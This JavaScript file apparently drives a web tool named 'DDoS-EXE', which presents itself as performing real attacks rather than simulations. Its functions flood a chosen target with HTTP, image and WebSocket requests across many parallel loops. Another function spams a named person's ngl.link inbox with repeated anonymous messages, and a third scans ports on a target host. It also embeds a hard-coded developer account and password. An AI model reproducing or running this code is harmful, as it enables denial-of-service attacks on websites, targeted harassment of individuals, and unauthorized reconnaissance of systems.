/**
 * DDoS-EXE PROTOCOL - REAL IMPLEMENTATION
 * WARNING: This performs actual network attacks
 */

const DDOSEngine = (function() {
    // Configuration
    const CONFIG = {
        VERSION: '3.0-REAL',
        DATA_KEY: 'ddos_exe_real_data',
        NGL_API: 'https://ngl.link/api/submit',
        PROXY_LIST: [
            'https://cors-anywhere.herokuapp.com/',
            'https://api.allorigins.win/raw?url='
        ],
        DEFAULT_ACCOUNTS: [
            {
                username: 'DinoD',
                password: 'DinoProtocol',
                type: 'developer',
                created: Date.now(),
                expires: Number.MAX_SAFE_INTEGER
            }
        ]
    };

    // State variables
    let appData = { users: [], attacks: [], logs: [] };
    let activeAttack = null;
    let activeSpam = null;
    let activeScan = null;

    // Initialize
    function init() {
        const saved = localStorage.getItem(CONFIG.DATA_KEY);
        if (saved) {
            appData = JSON.parse(saved);
            // Ensure DinoD account exists
            if (!appData.users.find(u => u.username === 'DinoD')) {
                appData.users.push(CONFIG.DEFAULT_ACCOUNTS[0]);
            }
        } else {
            appData.users = CONFIG.DEFAULT_ACCOUNTS;
            appData.attacks = [];
            appData.logs = [];
        }
        saveData();
        logToGlobal('[SYSTEM] REAL MODE ENGAGED - No simulations');
    }

    // Save data
    function saveData() {
        localStorage.setItem(CONFIG.DATA_KEY, JSON.stringify(appData));
    }

    // Authentication
    function authenticate(username, password) {
        const user = appData.users.find(u => 
            u.username === username && u.password === password
        );
        
        if (user) {
            if (user.expires !== Number.MAX_SAFE_INTEGER && Date.now() > user.expires) {
                logToGlobal(`[AUTH] Account ${username} expired`);
                return false;
            }
            sessionStorage.setItem('current_user', username);
            logToGlobal(`[AUTH] Access granted: ${username}`);
            return true;
        }
        return false;
    }

    // === REAL DDoS ATTACK FUNCTIONS ===
    function startRealDDoSAttack(target, port, type, duration, proxyMode) {
        logToGlobal(`[ATTACK] Launching REAL DDoS on ${target}:${port}`);
        
        // Clean target URL
        target = target.replace(/https?:\/\//, '').replace(/\/$/, '');
        
        // Create attack controller
        activeAttack = {
            running: true,
            startTime: Date.now(),
            endTime: Date.now() + (duration * 1000),
            requestCount: 0,
            workers: []
        };
        
        // Start attack based on type
        const threads = Math.min(type / 50, 100); // Calculate threads
        logToGlobal(`[ATTACK] Starting ${threads} attack threads`);
        
        for (let i = 0; i < threads; i++) {
            startAttackThread(target, port, type, duration, proxyMode, i);
        }
        
        // Monitor attack
        const attackInterval = setInterval(() => {
            if (!activeAttack.running || Date.now() > activeAttack.endTime) {
                clearInterval(attackInterval);
                stopDDoSAttack();
            } else {
                const elapsed = Math.floor((Date.now() - activeAttack.startTime) / 1000);
                const remaining = duration - elapsed;
                logToGlobal(`[ATTACK] ${activeAttack.requestCount} requests sent | ${remaining}s remaining`);
            }
        }, 1000);
        
        return true;
    }

    function startAttackThread(target, port, rps, duration, proxyMode, threadId) {
        const requestsPerSecond = Math.floor(rps / 50); // Distribute RPS
        let requestCount = 0;
        
        function sendRequest() {
            if (!activeAttack || !activeAttack.running) return;
            if (Date.now() > activeAttack.endTime) return;
            
            // Send actual HTTP request
            const url = port === 443 ? `https://${target}` : `http://${target}:${port}`;
            
            // Method 1: Fetch API
            fetch(url, {
                method: 'GET',
                mode: 'no-cors',
                cache: 'no-store',
                headers: {
                    'X-Attack-ID': `ddos-exe-${threadId}-${Date.now()}`,
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1'
                }
            })
            .catch(() => {}) // Ignore errors
            .finally(() => {
                requestCount++;
                activeAttack.requestCount++;
            });
            
            // Method 2: Image ping (for additional traffic)
            const img = new Image();
            img.src = `${url}/?${Date.now()}-${Math.random()}`;
            
            // Method 3: WebSocket if port supports it
            if (port === 80 || port === 443 || port === 8080) {
                try {
                    const wsUrl = port === 443 ? `wss://${target}` : `ws://${target}:${port}`;
                    const ws = new WebSocket(wsUrl);
                    ws.onopen = () => ws.close();
                    setTimeout(() => ws.close(), 100);
                } catch (e) {}
            }
            
            // Continue if still running
            if (activeAttack && activeAttack.running && Date.now() < activeAttack.endTime) {
                const delay = Math.floor(1000 / requestsPerSecond);
                setTimeout(sendRequest, delay);
            }
        }
        
        // Start this thread
        for (let i = 0; i < requestsPerSecond; i++) {
            setTimeout(() => sendRequest(), i * (1000 / requestsPerSecond));
        }
    }

    function stopDDoSAttack() {
        if (activeAttack) {
            activeAttack.running = false;
            activeAttack = null;
            logToGlobal('[ATTACK] Stopped - all attack threads terminated');
        }
    }

    // === REAL NGL SPAM FUNCTIONS ===
    async function startRealNGLSpam(username, message, count, delay, senderName) {
        if (!username || !message) {
            alert('Username and message required');
            return false;
        }
        
        logToGlobal(`[NGL] Starting REAL spam to ngl.link/${username}`);
        logToGlobal(`[NGL] Message: "${message.substring(0, 100)}${message.length > 100 ? '...' : ''}"`);
        
        activeSpam = {
            running: true,
            sent: 0,
            failed: 0
        };
        
        // NGL API endpoint
        const nglUrl = `https://ngl.link/api/submit`;
        
        for (let i = 0; i < count && activeSpam.running; i++) {
            try {
                // Create form data
                const formData = new FormData();
                formData.append('username', username);
                formData.append('question', message);
                if (senderName && senderName.trim()) {
                    formData.append('deviceId', senderName.trim());
                }
                
                // Send actual request
                const response = await fetch(nglUrl, {
                    method: 'POST',
                    mode: 'cors',
                    headers: {
                        'Accept': 'application/json',
                        'X-Requested-With': 'XMLHttpRequest'
                    },
                    body: formData
                });
                
                if (response.ok) {
                    activeSpam.sent++;
                    logToGlobal(`[NGL] Sent ${activeSpam.sent}/${count} to ${username}`);
                } else {
                    activeSpam.failed++;
                    logToGlobal(`[NGL] Failed ${activeSpam.failed} requests`);
                }
                
                // Update UI
                const nglTerminal = document.getElementById('nglTerminal');
                if (nglTerminal) {
                    const lines = nglTerminal.querySelectorAll('.terminal-line');
                    if (lines.length > 0) {
                        const lastLine = lines[lines.length - 1];
                        lastLine.textContent = `[NGL] Progress: ${activeSpam.sent}/${count} sent, ${activeSpam.failed} failed`;
                    }
                }
                
            } catch (error) {
                activeSpam.failed++;
                logToGlobal(`[NGL] Error: ${error.message}`);
            }
            
            // Delay between requests
            if (i < count - 1 && activeSpam.running) {
                await new Promise(resolve => setTimeout(resolve, delay));
            }
        }
        
        logToGlobal(`[NGL] Completed: ${activeSpam.sent} sent, ${activeSpam.failed} failed`);
        activeSpam = null;
        return true;
    }

    // === REAL IP SCANNER FUNCTIONS ===
    async function startRealIPScan(target, ports, timeout, method) {
        if (!target) {
            alert('Target required');
            return false;
        }
        
        logToGlobal(`[SCAN] Starting REAL port scan: ${target}`);
        activeScan = { running: true, results: [] };
        
        const portList = ports.split(',').map(p => parseInt(p.trim())).filter(p => !isNaN(p));
        const resultsDiv = document.getElementById('scanResults');
        if (resultsDiv) resultsDiv.innerHTML = '';
        
        // Scan each port
        for (const port of portList) {
            if (!activeScan.running) break;
            
            const result = await scanPort(target, port, timeout, method);
            activeScan.results.push(result);
            
            // Display result
            if (resultsDiv) {
                const resultDiv = document.createElement('div');
                resultDiv.className = 'scan-result';
                resultDiv.innerHTML = `
                    <span>${port}</span>
                    <span class="status-${result.status === 'OPEN' ? 'open' : 'closed'}">${result.status}</span>
                    <span>${result.service || 'Unknown'}</span>
                `;
                resultsDiv.appendChild(resultDiv);
            }
            
            logToGlobal(`[SCAN] Port ${port}: ${result.status} (${result.method})`);
            
            // Small delay between scans
            await new Promise(resolve => setTimeout(resolve, 100));
        }
        
        logToGlobal(`[SCAN] Completed: ${activeScan.results.filter(r => r.status === 'OPEN').length} ports open`);
        activeScan = null;
        return true;
    }

    async function scanPort(target, port, timeout, method) {
        const startTime = Date.now();
        
        // Try multiple methods
        if (method === 'http' || method === 'mixed') {
            try {
                // HTTP/HTTPS check
                const protocol = port === 443 ? 'https' : 'http';
                const url = `${protocol}://${target}:${port}`;
                
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), timeout);
                
                const response = await fetch(url, {
                    method: 'HEAD',
                    mode: 'no-cors',
                    signal: controller.signal,
                    cache: 'no-store'
                }).catch(() => null);
                
                clearTimeout(timeoutId);
                
                if (response !== null) {
                    return {
                        port,
                        status: 'OPEN',
                        method: 'HTTP',
                        service: getServiceName(port),
                        responseTime: Date.now() - startTime
                    };
                }
            } catch (e) {}
        }
        
        if (method === 'websocket' || method === 'mixed') {
            try {
                // WebSocket check
                const wsProtocol = port === 443 ? 'wss' : 'ws';
                const wsUrl = `${wsProtocol}://${target}:${port}`;
                
                const wsCheck = await new Promise((resolve) => {
                    const ws = new WebSocket(wsUrl);
                    let resolved = false;
                    
                    const timeoutId = setTimeout(() => {
                        if (!resolved) {
                            ws.close();
                            resolve(false);
                        }
                    }, timeout);
                    
                    ws.onopen = () => {
                        resolved = true;
                        clearTimeout(timeoutId);
                        ws.close();
                        resolve(true);
                    };
                    
                    ws.onerror = () => {
                        if (!resolved) {
                            resolved = true;
                            clearTimeout(timeoutId);
                            resolve(false);
                        }
                    };
                });
                
                if (wsCheck) {
                    return {
                        port,
                        status: 'OPEN',
                        method: 'WebSocket',
                        service: getServiceName(port),
                        responseTime: Date.now() - startTime
                    };
                }
            } catch (e) {}
        }
        
        // Port closed or timeout
        return {
            port,
            status: 'CLOSED',
            method: method.toUpperCase(),
            service: 'Unknown',
            responseTime: Date.now() - startTime
        };
    }

    function getServiceName(port) {
        const services = {
            21: 'FTP',
            22: 'SSH',
            23: 'Telnet',
            25: 'SMTP',
            53: 'DNS',
            80: 'HTTP',
            110: 'POP3',
            143: 'IMAP',
            443: 'HTTPS',
            465: 'SMTPS',
            587: 'SMTP',
            993: 'IMAPS',
            995: 'POP3S',
            3306: 'MySQL',
            3389: 'RDP',
            5432: 'PostgreSQL',
            5900: 'VNC',
            8080: 'HTTP-Alt',
            8443: 'HTTPS-Alt'
        };
        return services[port] || 'Unknown';
    }

    // === UTILITY FUNCTIONS ===
    function logToGlobal(message) {
        const logDiv = document.getElementById('globalLog');
        if (logDiv) {
            const entry = document.createElement('div');
            entry.className = 'log-entry';
            entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
            logDiv.appendChild(entry);
            logDiv.scrollTop = logDiv.scrollHeight;
        }
        console.log(`[REAL] ${message}`);
    }

    function getCurrentUser() {
        const username = sessionStorage.getItem('current_user');
        return appData.users.find(u => u.username === username);
    }

    // Initialize
    init();

    // Public API
    return {
        authenticate,
        getCurrentUser,
        startRealDDoSAttack,
        stopDDoSAttack,
        startRealNGLSpam,
        startRealIPScan,
        logToGlobal
    };
})();

// Event listeners for REAL mode
document.addEventListener('DOMContentLoaded', function() {
    // DDoS Attack
    document.getElementById('startAttack')?.addEventListener('click', function() {
        const target = document.getElementById('targetInput').value;
        const port = document.getElementById('portInput').value;
        const type = document.getElementById('attackTypeSelect').value;
        const duration = document.getElementById('durationInput').value;
        const proxy = document.getElementById('proxyMode').value;
        
        if (!target) {
            alert('Target is required');
            return;
        }
        
        if (confirm(`REAL ATTACK WILL START\nTarget: ${target}:${port}\nDuration: ${duration}s\n\nYour IP will be visible to target!`)) {
            DDOSEngine.startRealDDoSAttack(target, port, type, duration, proxy);
        }
    });
    
    document.getElementById('stopAttack')?.addEventListener('click', function() {
        DDOSEngine.stopDDoSAttack();
    });
    
    // NGL Spam
    document.getElementById('startSpam')?.addEventListener('click', function() {
        const username = document.getElementById('nglUsername').value;
        const message = document.getElementById('nglMessage').value;
        const count = document.getElementById('spamCount').value;
        const delay = document.getElementById('spamDelay').value;
        const sender = document.getElementById('senderName').value;
        
        if (!username || !message) {
            alert('Username and message required');
            return;
        }
        
        if (confirm(`Send ${count} REAL messages to ngl.link/${username}?\n\nMessage: ${message.substring(0, 100)}`)) {
            DDOSEngine.startRealNGLSpam(username, message, parseInt(count), parseInt(delay), sender);
        }
    });
    
    // IP Scanner
    document.getElementById('startScan')?.addEventListener('click', function() {
        const target = document.getElementById('scanTarget').value;
        const ports = document.getElementById('portsToScan').value;
        const timeout = document.getElementById('scanTimeout').value;
        const method = document.getElementById('scanMethod').value;
        
        if (!target) {
            alert('Target required');
            return;
        }
        
        DDOSEngine.startRealIPScan(target, ports, parseInt(timeout), method);
    });
});